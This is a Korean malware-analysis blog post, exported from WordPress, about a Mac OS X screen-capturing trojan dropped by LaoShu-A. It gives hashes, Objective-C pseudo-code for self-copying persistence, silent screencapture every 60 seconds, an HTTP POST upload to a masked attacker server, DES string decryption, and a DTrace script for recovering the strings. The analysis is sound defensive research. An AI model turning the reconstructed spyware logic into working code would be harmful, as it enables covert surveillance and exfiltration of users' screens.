---
layout: post
title: 'Malware Analysis : Downloaded malware by LaoShu-A'
date: 2014-01-23 16:54:44.000000000 +09:00
type: post
published: true
status: publish
categories:
- Malware Analysis
tags:
- data-stealing
- Kitmos
- Laoshu-A
- Trojan
meta:
  _edit_last: '1'
  _wpas_done_all: '1'
  slide_template: default
  pyre_video: ''
  pyre_full_width: 'no'
  pyre_sidebar_position: default
  pyre_fimg_width: ''
  pyre_fimg_height: ''
  pyre_image_rollover_icons: linkzoom
  pyre_link_icon_url: ''
  pyre_related_posts: 'yes'
  pyre_slider_type: 'no'
  pyre_slider: '0'
  pyre_wooslider: '0'
  pyre_flexslider: '0'
  pyre_revslider: '0'
  pyre_elasticslider: '0'
  pyre_fallback: ''
  pyre_page_bg_layout: default
  pyre_page_bg: ''
  pyre_page_bg_color: ''
  pyre_page_bg_full: 'no'
  pyre_page_bg_repeat: repeat
  pyre_wide_page_bg: ''
  pyre_wide_page_bg_color: ''
  pyre_wide_page_bg_full: 'no'
  pyre_wide_page_bg_repeat: repeat
  pyre_header_bg: ''
  pyre_header_bg_color: ''
  pyre_header_bg_full: 'no'
  pyre_header_bg_repeat: repeat
  pyre_page_title: 'no'
  pyre_page_title_text: 'no'
  pyre_page_title_custom_text: ''
  pyre_page_title_custom_subheader: ''
  pyre_page_title_height: ''
  pyre_page_title_bar_bg: ''
  pyre_page_title_bar_bg_retina: ''
  pyre_page_title_bar_bg_full: default
  pyre_page_title_bar_bg_color: ''
  pyre_page_title_bg_parallax: default
  avada_post_views_count: '2773'
  sbg_selected_sidebar: a:1:{i:0;s:1:"0";}
  sbg_selected_sidebar_replacement: a:1:{i:0;s:1:"0";}
  fusion_builder_content_backup: "<p style=\"padding-left: 30px;\">예전부터 Mac OS X 악성코드
    분석 글을 올리려고 했는데 이제서야 글을 올린다. 앞으로 기존에 했던 악성코드 분석 내용도 올려보도록 하겠다. 이 글을 빌어 쿨캣님에게 감사의
    말을 전한다. :-)</p>\n\n<h2></h2>\n<h2>1. 시작</h2>\n2014년 1월 21일 Sophos에서 Mac OS X의
    새로운 악성코드가 발견되었다는 글이 올라왔다.\n\n<a href=\"http://nakedsecurity.sophos.com/2014/01/21/data-stealing-malware-targets-mac-users-in-undelivered-courier-item-attack/\"
    target=\"_blank\">Digitally signed data-stealing malware targets Mac users in
    \"undelivered courier item\" attack</a>\n\n쿨캣님을 통해 위 악성코드 배포자가 배포하는 다른 악성코드의 링크를
    획득하여 총 두 개의 샘플을 획득했다. 참고로 이 두 샘플은 위 링크의 Sophos가 분석한 RAT에서 다운로드하여 실행하는 악성코드이며 Sophos가
    분석한 RAT은 아니다. 실행 파일의 해시 값은 다음과 같다.\n<ul>\n\t<li>MD5 (cff.app/Contents/MacOS/cff)
    = 467cd41726d276d3da442e2f0e65f0a0</li>\n\t<li>MD5 (OSX_Update.app/Contents/MacOS/worty)
    = ea2045d1344719d95f85ee8a2fcbe0a7</li>\n</ul>\n두 악성코드는 비슷한 임무를 수행하며, 코드도 상당히
    유사하다. 같은 제작자가 개발한 변종으로 추정된다. 이 포스트에서는 이 중 하나인 \"OSX_Update.app\"을 분석하도록 한다.\n\n<a
    href=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-23-at-3.30.26-PM.png\"><img
    class=\"aligncenter size-full wp-image-712\" alt=\"worty\" src=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-23-at-3.30.26-PM.png\"
    width=\"607\" height=\"276\" /></a>\n\n이 악성코드의 주요 기능은 다음과 같다.\n<ul>\n\t<li>Notification을
    통한 기능수행</li>\n\t<li>사용자 디렉터리의 라이브러리 폴더에 자신을 복사한 후 실행, 원래 동작 중인 프로세스는 특별한 임무를 수행하지
    않고 종료</li>\n\t<li>라이브러리 폴더에서 실행된 악성코드는 현재 시스템의 화면을 캡쳐</li>\n\t<li>캡쳐한 화면을 특정 URL에
    업로드</li>\n\t<li>민감한 문자열은 전부 암호화하여 보관</li>\n</ul>\n<span style=\"line-height: 1.5em;\">악성코드
    개발 환경은  xCode 이다. 참고로  xCode로 개발한 애플리케이션의 경우, 코코아 라이브러리는 전부 다 obj_msgSend의 id와
    selector를 이용하여 클래스 및 메서드를 호출한다. </span>\n\n&nbsp;\n<h2>2. Notification을 통한 기능
    수행</h2>\nMac OS X는 start-&gt;NSApplicationMain 형태로 애플리케이션을 구동하도록 되어 있다. 하지만 이
    악성코드를 보면, 여기에서는 별다른 역할을 수행하지 않고 종료하는 것을 볼 수 있다.\n\n<a href=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.34.01-AM.png\"><img
    class=\"aligncenter size-full wp-image-728\" alt=\"_start\" src=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.34.01-AM.png\"
    width=\"684\" height=\"425\" /></a>\n\nMac OS X에서는 NSApplicationMain을 통해 코드를 실행하는
    방법 외에도 노티피케이션(Notification)을 통해 특정 클래스 함수를 실행할 수 있다. 노티피케이션이란, 두 애플리케이션, 데몬, 또는
    다른 애플리케이션간의 상태 정보를 공유한다는 의미로, 내부-프로세스 통신(interprocess communication)을 수행할 수 있게
    한다 <a href=\"https://developer.apple.com/library/mac/documentation/Darwin/Conceptual/MacOSXNotifcationOv/Introduction/Introduction.html\"
    target=\"_blank\">[1]</a>. 악성코드의 대부분의 기능이 들어있는 popAppDelegate 클래스에 애플리케이션의 실행이
    완료되었을 때 발생하는 \"applicationDidFinishLaunching\" Notification을 받아 처리할 수 있도록 핸들러가
    정의되어 있다.\n\n<a href=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.35.33-AM.png\"><img
    class=\"aligncenter size-full wp-image-729\" alt=\"notification handler\" src=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.35.33-AM.png\"
    width=\"836\" height=\"605\" /></a>\n\nMac Developer Library를 보면, 이 메서드는 \"애플리케이션이
    실행된 후에 노티피케이션 센터에 의해 전송되며, 가장 처음으로 받을 수 있는 노티피케이션<a href=\"https://developer.apple.com/library/mac/documentation/cocoa/reference/NSApplicationDelegate_Protocol/Reference/Reference.html#//apple_ref/occ/intfm/NSApplicationDelegate/applicationDidFinishLaunching:\"
    target=\"_blank\">[2]</a>\"이라고 하며, 상속자는 이 메서드를 사용하여 추가적인 초기화 작업을 수행할 수 있다고 명시되어
    있다.\n<div>\n<blockquote>\n<h3 id=\"jumpTo_18\">applicationDidFinishLaunching:</h3>\nSent
    by the default notification center after the application has been launched and
    initialized but before it has received its first event.\n<div>- (void)applicationDidFinishLaunching:(<a
    href=\"https://developer.apple.com/library/mac/documentation/cocoa/reference/Foundation/Classes/NSNotification_Class/Reference/Reference.html#//apple_ref/doc/c_ref/NSNotification\">NSNotification</a> *)<em>aNotification</em></div>\n<div>\n<h5>Parameters</h5>\n<dl><dt><em>aNotification</em></dt><dd>A
    notification named <code><a href=\"https://developer.apple.com/library/mac/documentation/cocoa/reference/ApplicationKit/Classes/NSApplication_Class/Reference/Reference.html#//apple_ref/c/data/NSApplicationDidFinishLaunchingNotification\"
    target=\"_self\">NSApplicationDidFinishLaunchingNotification</a></code>. Calling
    the <code><a href=\"https://developer.apple.com/library/mac/documentation/cocoa/reference/Foundation/Classes/NSNotification_Class/Reference/Reference.html#//apple_ref/occ/instm/NSNotification/object\"
    target=\"_self\">object</a></code> method of this notification returns the <code>NSApplication</code> object
    itself.&nbsp;\n\n</dd></dl></div>\n<div>\n<h5>Discussion</h5>\nDelegates can implement
    this method to perform further initialization. This method is called after the
    application’s main run loop has been started but before it has processed any events.
    If the application was launched by the user opening a file, the delegate’s <code><a
    href=\"https://developer.apple.com/library/mac/documentation/cocoa/reference/NSApplicationDelegate_Protocol/Reference/Reference.html#//apple_ref/occ/intfm/NSApplicationDelegate/application:openFile:\"
    target=\"_self\">application:openFile:</a></code> method is called before this
    method. If you want to perform initialization before any files are opened, implement
    the <code><a href=\"https://developer.apple.com/library/mac/documentation/cocoa/reference/NSApplicationDelegate_Protocol/Reference/Reference.html#//apple_ref/occ/intfm/NSApplicationDelegate/applicationWillFinishLaunching:\">applicationWillFinishLaunching:</a></code> method
    in your delegate, which is called before<code><a href=\"https://developer.apple.com/library/mac/documentation/cocoa/reference/NSApplicationDelegate_Protocol/Reference/Reference.html#//apple_ref/occ/intfm/NSApplicationDelegate/application:openFile:\"
    target=\"_self\">application:openFile:</a></code>.)\n\n</div>\n<div>\n<h5>Availability</h5>\n<ul>\n\t<li>Available
    in OS X v10.0 and later.</li>\n\t<li>Available as part of an informal protocol
    prior to OS X v10.6.</li>\n</ul>\n</div>\n<div>\n<h5>See Also</h5>\n<ul>\n\t<li><code><a
    href=\"https://developer.apple.com/library/mac/documentation/cocoa/reference/ApplicationKit/Classes/NSApplication_Class/Reference/Reference.html#//apple_ref/occ/instm/NSApplication/finishLaunching\"
    target=\"_self\">finishLaunching</a></code> (NSApplication)</li>\n\t<li><code><a
    href=\"https://developer.apple.com/library/mac/documentation/cocoa/reference/NSApplicationDelegate_Protocol/Reference/Reference.html#//apple_ref/occ/intfm/NSApplicationDelegate/applicationWillFinishLaunching:\">– applicationWillFinishLaunching:</a></code></li>\n\t<li><code><a
    href=\"https://developer.apple.com/library/mac/documentation/cocoa/reference/NSApplicationDelegate_Protocol/Reference/Reference.html#//apple_ref/occ/intfm/NSApplicationDelegate/applicationDidBecomeActive:\">– applicationDidBecomeActive:</a></code></li>\n\t<li><code><a
    href=\"https://developer.apple.com/library/mac/documentation/cocoa/reference/NSApplicationDelegate_Protocol/Reference/Reference.html#//apple_ref/occ/intfm/NSApplicationDelegate/application:openFile:\">– application:openFile:</a></code></li>\n</ul>\n</div>\n<div>\n<h5>Declared
    In</h5>\n<code>NSApplication.h</code>\n\n</div></blockquote>\n<code><span style=\"font-family:
    Georgia, 'Times New Roman', 'Bitstream Charter', Times, serif; line-height: 1.5em;\">즉,
    이 악성코드는 'start'와 '_main'을 분석 시작점으로 잡으면 안되고, 이 노티피케이 처리 메서드를 메인(main) 함수라 생각하고
    분석을 진행해야 한다. 위 코드를 보면, 이 노티피케이션 처리 메서드에서는 크게 3개의 함수를 실행하며, pseudo-code로 다음과 같이
    표현될 수 있다.</span></code>\n<pre class=\"lang:objc decode:true\">- (void)applicationDidFinishLaunching:(NSNotification
    *)aNotification\n{\n    [self wort]; // \"~/Library\" 디렉터리에 자신을 복사하고 실행\n    uint
    connected = 0;\n    while(1)\n    {\n        while(!connected)\n        {\n            connected
    = [self eqox]; // 공격자 도메인 연결 테스트\n        }\n        [self bovx]; // 60초 간격으로
    화면을 캡쳐하고 공격자 서버로 전송 함.\n    }\n}</pre>\n즉 이 악성코드는 60초 간격으로 화면을 캡쳐하여 공격자에게 지속적으로
    전송하는 악성코드이다. 이제 각 메서드에 대해 알아보도록 하자.\n\n</div>\n&nbsp;\n<h2>3. 사용자 라이브러리 폴더(~/Library)에
    자신을 복사한 후 실행 (wort method)</h2>\n악성코드는 최초 wort 메서드를 실행한다. 이 메서드는  현재 악성코드를 실행한
    사용자의 라이브러리 디렉터리(\"~/Library\")에 자기 자신을 복사한다.\n\n<a href=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.37.18-AM.png\"><img
    class=\"aligncenter size-full wp-image-730\" alt=\"wort\" src=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.37.18-AM.png\"
    width=\"1142\" height=\"574\" /></a>\n\n위 내용을 pseudo 코드로 작성하면 다음과 같다.\n<pre class=\"lang:objc
    decode:true\" title=\"wort method\">NSString *Homepath = NSHomeDirectory(); //
    사용자의 홈 디렉터리를 가져온다.\nNSString *currentpath = [[NSBundle mainBundle] bundlePath];
    // 악성코드의 경로(.app까지)를 가져온다.\nNSString *Apppath = [currentpath lastPathComponent];
    // 악성코드 명(OSX_Update.app)을 가져온다.\nNSString *librartpath = [\bself cxx:@\"w7za3rq88br84zqSVKrrWQ==\"];
    // \"/Library\"\n\nNSString *destpath = [NSString stringWithFormat:@\"%@%@%@\",
    Homepath, librarypath, Apppath]; // destpath에 \"~/Library/OSX_Update.app\" 저장\n\nNSFileManager
    dest = [NSFileManager defaultManager:destpath];\n....\nif ([dest fileExistAtPath])
    // \"~/Library\"에 이미 파일이 있다면\n{\n    [self soz: destpath];\n}\nelse\n{\n    uint
    return_val = [dest copyItemAtPath:currentpath toPath:destpath error: nul]; //
    \"~/Library\"에 악성코드 복사\n    if (!return_val) { // 파일 복사에 실패한다면 (이미 구동 중이라면..)\n
    \      return return_val; // \"~/Library\"에 위치한 악성코드가 실행 중이라면 함수를 종료\n    }\n
    \   else {\n       [self soz: destpath];\n    }\n}\nsleep(30);\nexit(0); // 프로그램을
    종료</pre>\n여기에서 사용되는 경로 문자열은 전부 다 암호화되어 있다. 그리고 해당 문자열을 사용할 때마다 cxx 메서드를 이용하여 복호화를
    수행한다. wort 메서드는 악성코드를 \"~/Library\"로 복사하고, soz 메서드를 실행한다.\n\n<a href=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.38.09-AM.png\"><img
    class=\"aligncenter size-full wp-image-731\" alt=\"soz method\" src=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.38.09-AM.png\"
    width=\"801\" height=\"490\" /></a>\n\nsoz는 \"stringWithFormat\"으로 \"open -a $HOME/Library/OSX_Update.app\"
    문자열을 만들고 sqq 메서드를 실행한다. sqq 메서드는 다음과 같다.\n\n<a href=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.38.58-AM.png\"><img
    class=\"aligncenter size-full wp-image-732\" alt=\"sqq\" src=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.38.58-AM.png\"
    width=\"870\" height=\"528\" /></a>\n\nsqq 메서드는 \"/bin/sh\" 명령으로 soz에서 만든 \"open
    -a ~\" 문자열을 실행(launched TaskWithLaunchPath) 한다.  위 내용을 pseudo-code로 작성하면 다음과 같다.\n<pre
    class=\"lang:default decode:true\" title=\"sqq method\">- (void) [PopAppDelegate
    sqq: openmalware] // \"open -a ~/Library/ ~~\"를 인자로 전달\n{\n    NSString shellpath
    = [self cxx:@\"fHXxeLSbD5g=\"]; // \"/bin/sh\"\n    NSArray arg = [NSArray arrayWithObjects:@\"-c\",
    @openmalware];\n    [NSTask launchedTaskWithLaunchPath:shellpath arguments:arg];
    // \"/bin/sh -c open -a $HOME/Library/OSX_Update.app\" 을 실행\n    uint return_val
    = [waitUntilExit];\n    return return_val;\n}</pre>\n즉, 악성코드는 복사한 악성코드를 실행하고 자기
    자신을 종료하게 된다. 요약하면 다음과 같다.\n<ul>\n\t<li>악성코드를 \"~/Library\"에 복사한다</li>\n\t<li>\"/bin/sh
    -c open -a ~/Library/OSX_Update.app\"을 실행한다.</li>\n\t<li>원본 악성코드는 exit(0);으로 종료된다.</li>\n\t<li>open으로
    실행된 자신의 복사본은 파일 복사를 실패(copyItemAtPath 메서드 실패)하여 exit되지 않고 return 됨으로 다음 메서드(eqox)를
    실행한다.</li>\n</ul>\n&nbsp;\n<h2>4. 서버 상태 체크</h2>\n해당 임무가 완료되면, 주기적으로 eqox 메서드를
    실행한다. 이 메서드는 공격자의 서버가 접속 가능한지 지속적으로 확인한다.\n\n<a href=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.39.58-AM.png\"><img
    class=\"aligncenter size-full wp-image-733\" alt=\"eqox method\" src=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.39.58-AM.png\"
    width=\"651\" height=\"446\" /></a>\n\n위 코드는 Objective C 코드로 작성하면 다음과 같다.\n<pre
    class=\"lang:default decode:true\" title=\"eqox method\">- (uint) [eqox]\n{\n
    \   NSString domainname = [self cxx:@\"HtYGE4fFRj4DMt9S9V/8GlFP+BOPsjBH]; // 도메인
    명을 복호화하여 저장\n    NSURL url = [NSURL initWithString:domainname];\n    NSURLRequest
    request = [NSURLRequest alloc] initWithURL:url cachePolicy:0x01 timeoutInterval:];
    // URL 요청 패킷을 생성, cachepolicy:NSURLRequestReloadIgnoringLocalCacheData(0x01)\n
    \   return_val = [NSURLConnection sendSynchronousRequest:request returningResponse:nil
    error:nil];\n    if (return_val == nil) // 접속 실패 시\n    {\n        return -1;\n
    \   }\n    else // 접속 성공 시\n    {\n        return 0;\n    }\n}</pre>\n해당 도메인을
    복호화하면 \"http://fxxxxxxh.com\" 정보를 획득할 수 있다. <span style=\"line-height: 1.5em;\">해당
    도메인을 whois로 조회해보면 러시아에 위치한다.</span>\n\n<a href=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-23-at-3.34.19-PM.png\"><img
    class=\"aligncenter size-full wp-image-713\" alt=\"whois?\" src=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-23-at-3.34.19-PM.png\"
    width=\"864\" height=\"371\" /></a>\n\nwhois 결과를 봐도; 자기 자신을 숨기기 위한 노력을 많이 하는 걸
    볼 수 있는데, 등록자 이메일이나 주인의 이름을 Privacy Protection Service를 이용하여 숨겨두었다.\n\n<a href=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-10.48.40-AM.png\"><img
    class=\"aligncenter size-full wp-image-724\" alt=\"whois 결과\" src=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-10.48.40-AM.png\"
    width=\"542\" height=\"182\" /></a>\n<h3></h3>\n&nbsp;\n<h2>5. 현재 시스템 화면을 캡처(bovx
    method part 1)</h2>\n도메인 접속을 확인하고 나면,  bovx 메서드를 실행한다. 이 메서드는 \"/tmp/yang/[dateformat].png\"
    파일을 인자로하여 애플의 기본 프로그램인 \"screencapture\" 을 실행한다.\n\n<a href=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.41.18-AM.png\"><img
    class=\"aligncenter size-full wp-image-734\" alt=\"bovx method\" src=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.41.18-AM.png\"
    width=\"702\" height=\"417\" /></a>\n\nPseudo-Code는 다음과 같다.\n<pre class=\"lang:objc
    decode:true\" title=\"bovx method\">- (void) [bovx]\n{\n\tNSString tmp = [self
    cxx:@“fEh3F36QAeU=“]; // \"tmp\"\n\tNSString yang = [self cxx:@“/I1427B/2/w=“];
    // \"yang\"\n\tNSString path = [NSString stringWithFormat:@“%@%@%@“ tmp @“/“ yang];\n\tNSFileManager
    manager = [NSFileManager defaultManager];\n\tif (0 == [manager fileExistsAtPath:path])
    // 없으면 디렉터리 생성\n\t{\n\t\t[manager createDirectoryAtPath:path attributes:nil];\n\t}\n\tNSDate
    date = [NSDate date]\n\tNSDateFormatter dateformat = [[NSDateFormatter alloc]
    init];\n\tsetformat = [dateformat setDateFormat:[self cxx:@“kLBf7h7di4kSVBDQsZgCuzfbz16dIBnW”]];
    // \"yy-MM-dd-HH:mm:ss\"\n\tNSString screenshotdate = [setformat stringFromDate];\n\tNSString
    extension = [self cxx:@ “LMHrvuDJskY”]; // \".png\"\n\tNSString fullpath = [NSString
    stringWithFormat:@“%@%@%@%@“ tmp yang screenshotdate extension]; // \"/tmp/yang/[DATE].png\"\n\n\tNSTask
    screenshot_task = [[NSTask alloc] init];\n\t[screenshot_task setLaunchPath:[cry
    ccx:@“rC4TpBd2mYxv6TTdiRmofpvZwEgL5qiD”]]; // \"/usr/sbin/screencapture\"\n\tNSArray
    arguments = [NSArray arrayWithObjects:@“-x” @“-T” @“60” @“fullpath”];\n\n\t[screenshot_task
    setArguments:arguments];\n\t[screenshot_task launch]; // \"/usr/sbin/screencapture
    -x -T 60 /tmp/yang/[DATE].png\"를 실행\n\t[screenshot_task waitUntilExit];\n\tsleep(30);\n\t[self
    bong];\n\treturn_val = sleep(30);\n\treturn return_val;\n}</pre>\n절차는 다음과 같다.\n<ul>\n\t<li>\"/tmp/yang\"
    폴더가 존재하는지 확인한다. 없으면 해당 디렉터리를 생성한다.</li>\n\t<li>NSTask의 launch 메서드를 이용하여 \"/usr/sbin/screencapture
    -x -T 60 /tmp/yang/yy-MM-dd-HH:mm:ss.png\" 를 실행한다. 옵션으로 인해 화면 캡처 시 소리가 나지 않게 되고(-x),
    애플리케이션 실행 후, 60초 뒤에 이미지 파일을 생성(-T 60)한다.</li>\n\t<li>명령어가 종료되면 bong 메서드를 실행한다.</li>\n</ul>\n&nbsp;\n<h2>6.
    캡쳐된 화면을 특정 URL에 업로드 (bovx method part 2 - bong method)</h2>\nbong 메서드를 이용하여 특정
    URL에 악성코드가 캡쳐한 이미지를 올려둔다. 우선 URLRequest로 서버 접속을 수행한다.\n\n<a href=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.42.16-AM.png\"><img
    class=\"aligncenter size-full wp-image-735\" alt=\"bong method 1\" src=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.42.16-AM.png\"
    width=\"823\" height=\"398\" /></a>\n\n그리고 나서 HTTP Request 패킷을 생성한다. 패킷에서 HTTP
    Method, boundary, 'Content-Type\"은 암호화되어 있으므로 cxx 메서드로 복호화하여 패킷을 생성한다.\n\n<a href=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.43.27-AM.png\"><img
    class=\"aligncenter size-full wp-image-736\" alt=\"bong method part II\" src=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.43.27-AM.png\"
    width=\"964\" height=\"496\" /></a>\n\n결과적으로 만들어지는 HTTP 패킷의 내용은 다음과 같다. (주요 정보는
    생략하였다.)\n<blockquote>POST hxxp://xxxx.com/doxc/aqw.php?yin=~~\nmultipart/form-data;
    boundary=------------------------2342xxx234235xxxxx230\nContent-Disposition: attachment;
    name=\"userfile\"; filename=xxx\nContent-Type: application/octet-stream\n[encoded
    data]</blockquote>\n이렇게 이미지 파일 전송 작업을 마치면, 다시 서버 연결 상태를 체크하는 루틴으로 돌아가서 반복적인 작업을
    수행한다.\n\n&nbsp;\n<h2>7. 민감한 문자열은 암호화하여 보관</h2>\nMac OS X에는 고성능의 상용 패커가 전무하기 때문에
    자신의 주요 정보를 암호화하는 방향으로 최대한 자신의 정보를 숨기려는 노력을 한다. 이 악성코드도 앞 서 코드를 보면 알겠지만, 대부분의 주요
    데이터를 암호화하여 저장하고 있다. 이런 암호화에 사용되는 메서드가 cxx이다.\n\n<a href=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.44.26-AM.png\"><img
    class=\"aligncenter size-full wp-image-737\" alt=\"cxx method\" src=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.44.26-AM.png\"
    width=\"709\" height=\"374\" /></a>\n\ncxx 메서드는 내부적으로 cry 클래스를 사용하며 결국 cry 클래스의
    end 메서드에서 암호화를, ded 메서드에서 복호화를 수행한다.\n\n<a href=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.45.06-AM.png\"><img
    class=\"aligncenter size-full wp-image-738\" alt=\"ded method\" src=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-24-at-11.45.06-AM.png\"
    width=\"403\" height=\"257\" /></a>\n\n복호화를 담당하는 ded 메서드는 내부적으로 <a href=\"https://developer.apple.com/library/mac/documentation/Darwin/Reference/ManPages/man3/Common%20Crypto.3cc.html\"
    target=\"_blank\">CommonCrypto</a>(3cc) 함수인 CCCrypt를 이용하여 복호화를 수행한다. 함수에 들어가는
    각각의 인자 값은 다음과 같다.\n<pre class=\"lang:c++ decode:true\" title=\"CCCrypt\">CCCrypt(KCDDecrypt,
    KCCAlgorithmDES, kCCOptionPKCS7Padding, [KEY], 8, IV(0x0807060504030201), [DATAIN],
    SizeofDataIn, [DATAOUT], dataOutAvailable, dataOutMoved);</pre>\n사실 이걸 디스어셈블로
    풀려면 생각보다 시간이 많이 걸릴 수 있다.  이렇게 정직한 악성코드의 경우에도 원격 디버깅을 하지 않으면 쓸데없이 분석 시간을 축낼 수 있다.
    여기에서는 좀 더 편리한 방법인 <a href=\"http://en.wikipedia.org/wiki/Dtrace\" target=\"_blank\">DTrace</a>(Dynamic
    Trace)를 사용하였다. 최초 실행 시점부터 문자열을 추출할 수 있도록 lldb(<a href=\"http://en.wikipedia.org/wiki/LLVM\"
    target=\"_blank\">LLVM</a> Debugger)로 시작지점에 브레이크포인트를 잡고 실행했다. 사용된 스크립트는 다음과 같다.\n<pre
    class=\"lang:default decode:true\" title=\"hooked cccrypt function\">/* written
    by n0fate\n * dtrace -q -s cccrypt.d PID\n */\npid$1:libcommonCrypto.dylib:CCCrypt:entry\n/execname
    == \"worty\"/\n{\n\tprintf(\"%d %d %d key:%x size:%d iv:%x datainput:%x, dataoutput:%x\",
    arg0, arg1, arg2, arg3, arg4, arg5, arg6, arg8);\n\tself-&gt;dataoutput = arg8\n}\n\npid$1:libcommonCrypto.dylib:CCCrypt:return\n/execname
    == \"worty\"/\n{\n\tprintf(\"(%s)n\", copyinstr(self-&gt;dataoutput));\n\tustack(10,0);\n}</pre>\n함수
    시작 시점에 인자 값을 확인하고, 리턴된 후에 dataoutput에 저장된 문자열을 추출한다. 그리고 호출 스택을 뿌려줘서 어떤 메서드에서
    해당 함수를 호출하는지 확인한다. 이로 인해, 복호화된 문자열의 원래 암호문을 손쉽게 찾을 수 있다.  수행 결과는 다음과 같다.\n<pre
    class=\"lang:sh decode:true\" title=\"dtrace hooked ccrypt and showing user stack\">1
    1 1 key:60802f4f0030 size:8 iv:7fff5fbfe800 datainput:608059e42740, dataoutput:7fff5fbfe810(http://fxxxxxxxxch.com)\n\n
    \             libcommonCrypto.dylib`CCCrypt+0xcd\n              worty`0x0000000100002678+0xdd\n
    \             worty`0x0000000100001ee4+0x21\n              worty`0x00000001000013cb+0x23\n
    \             worty`0x000000010000137b+0x34\n              CoreFoundation`__CFNOTIFICATIONCENTER_IS_CALLING_OUT_TO_AN_OBSERVER__+0xc\n
    \             CoreFoundation`_CFXNotificationPost+0xb4d\n              Foundation`-[NSNotificationCenter
    postNotificationName:object:userInfo:]+0x44\n              AppKit`-[NSApplication
    _postDidFinishNotification]+0x121\n              AppKit`-[NSApplication _sendFinishLaunchingNotification]+0xc3\n1
    1 1 key:60002e2fb1b0 size:8 iv:7fff5fbfe7f0 datainput:600016c34f10, dataoutput:7fff5fbfe8001
    1 1 key:60002e6e2130 size:8 iv:7fff5fbfe7f0 datainput:600016c34f50, dataoutput:7fff5fbfe800(yang)\n\n
    \             libcommonCrypto.dylib`CCCrypt+0xcd\n              worty`0x0000000100002678+0xdd\n
    \             worty`0x0000000100001ee4+0x21\n              worty`0x0000000100001774+0x40\n
    \             worty`0x000000010000137b+0x4e\n              CoreFoundation`__CFNOTIFICATIONCENTER_IS_CALLING_OUT_TO_AN_OBSERVER__+0xc\n
    \             CoreFoundation`_CFXNotificationPost+0xb4d\n              Foundation`-[NSNotificationCenter
    postNotificationName:object:userInfo:]+0x44\n              AppKit`-[NSApplication
    _postDidFinishNotification]+0x121\n              AppKit`-[NSApplication _sendFinishLaunchingNotification]+0xc3\n1
    1 1 key:60002e4f49b0 size:8 iv:7fff5fbfe7f0 datainput:60005605d710, dataoutput:7fff5fbfe800(yy-MM-dd-HH:mm:ss?_?)\n\n
    \             libcommonCrypto.dylib`CCCrypt+0xcd\n              worty`0x0000000100002678+0xdd\n
    \             worty`0x0000000100001ee4+0x21\n              worty`0x0000000100001774+0x119\n
    \             worty`0x000000010000137b+0x4e\n              CoreFoundation`__CFNOTIFICATIONCENTER_IS_CALLING_OUT_TO_AN_OBSERVER__+0xc\n
    \             CoreFoundation`_CFXNotificationPost+0xb4d\n              Foundation`-[NSNotificationCenter
    postNotificationName:object:userInfo:]+0x44\n              AppKit`-[NSApplication
    _postDidFinishNotification]+0x121\n              AppKit`-[NSApplication _sendFinishLaunchingNotification]+0xc3\n1
    1 1 key:60002e6e1fb0 size:8 iv:7fff5fbfe7f0 datainput:600016c348b0, dataoutput:7fff5fbfe800(.pngM-dd-HH:mm:ss?_?)\n\n
    \             libcommonCrypto.dylib`CCCrypt+0xcd\n              worty`0x0000000100002678+0xdd\n
    \             worty`0x0000000100001ee4+0x21\n              worty`0x0000000100001774+0x150\n
    \             worty`0x000000010000137b+0x4e\n              CoreFoundation`__CFNOTIFICATIONCENTER_IS_CALLING_OUT_TO_AN_OBSERVER__+0xc\n
    \             CoreFoundation`_CFXNotificationPost+0xb4d\n              Foundation`-[NSNotificationCenter
    postNotificationName:object:userInfo:]+0x44\n              AppKit`-[NSApplication
    _postDidFinishNotification]+0x121\n              AppKit`-[NSApplication _sendFinishLaunchingNotification]+0xc3\n1
    1 1 key:60002e6e1f30 size:8 iv:7fff5fbfe7f0 datainput:600055e44870, dataoutput:7fff5fbfe800(/usr/sbin/screencapture)\n\n
    \             libcommonCrypto.dylib`CCCrypt+0xcd\n              worty`0x0000000100002678+0xdd\n
    \             worty`0x0000000100001ee4+0x21\n              worty`0x0000000100001774+0x1b6\n
    \             worty`0x000000010000137b+0x4e\n              CoreFoundation`__CFNOTIFICATIONCENTER_IS_CALLING_OUT_TO_AN_OBSERVER__+0xc\n
    \             CoreFoundation`_CFXNotificationPost+0xb4d\n              Foundation`-[NSNotificationCenter
